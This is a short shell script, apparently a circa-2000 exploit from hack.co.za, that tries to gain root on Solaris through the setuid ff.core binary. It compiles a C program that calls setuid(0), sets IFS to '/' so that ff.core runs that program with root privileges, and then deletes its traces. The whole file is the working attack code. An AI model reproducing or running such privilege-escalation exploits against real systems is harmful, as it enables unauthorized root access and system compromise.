#!/bin/sh -f
# try to exploit ff.core hole (?? does solaris honour suid IFS changes?)

cat > usr.c << _EOF_
main() {
printf("uid=%d gid=%d\n", getuid(), getgid());
 setuid(0); setgid(0); seteuid(0); setegid(0);
 printf("uid after set=%d\n", getuid());
}
_EOF_
cc -o usr usr.c
chmod 700 usr
IFS="/"
export IFS
/usr/openwin/bin/ff.core 0 0 0 0 0
#ffc 0 0 fd0/fd0 1
rm -f usr usr.c
#                 www.hack.co.za           [2000]#